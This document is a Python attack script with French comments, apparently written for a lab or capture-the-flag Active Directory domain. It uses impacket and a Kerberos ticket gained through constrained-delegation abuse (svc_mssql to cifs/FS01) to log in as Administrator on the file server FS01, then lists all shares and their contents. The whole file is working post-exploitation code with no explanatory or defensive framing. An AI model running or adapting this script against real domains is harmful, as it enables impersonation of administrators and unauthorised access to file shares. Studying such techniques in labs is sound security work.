#!/usr/bin/env python3
"""Enumere FS01 en utilisant le ticket Kerberos (delegation contrainte svc_mssql -> cifs/FS01)."""
import os, sys
os.environ['KRB5CCNAME'] = os.path.join(os.path.dirname(__file__),
    'Administrator@contact@example.invalid')

from impacket.smbconnection import SMBConnection

TARGET = 'FS01.valdoria.fbi.lab'
IP = '172.28.5.5'
DOMAIN = 'valdoria.fbi.lab'

conn = SMBConnection(TARGET, IP, sess_port=445)
conn.kerberosLogin('Administrator', '', DOMAIN, '', '', kdcHost='172.28.5.3', useCache=True)
print(f"[+] auth OK sur {TARGET} ({IP}) en tant qu'Administrator")

print("\n=== Partages FS01 ===")
for sh in conn.listShares():
    print(f"  {sh['shi1_netname']}  type={sh['shi1_type']}  remark={sh['shi1_remark']}")

# Lister le contenu des partages non-systeme
for sh in conn.listShares():
    name = sh['shi1_netname']
    if name in ('IPC$',):
        continue
    print(f"\n=== contenu de \\\\{TARGET}\\{name} ===")
    try:
        t = conn.getTreeConnect(name)
        for f in t.listPath('*', '*'):
            print("  ", f.get_longname())
    except Exception as e:
        print("  [!]", e)
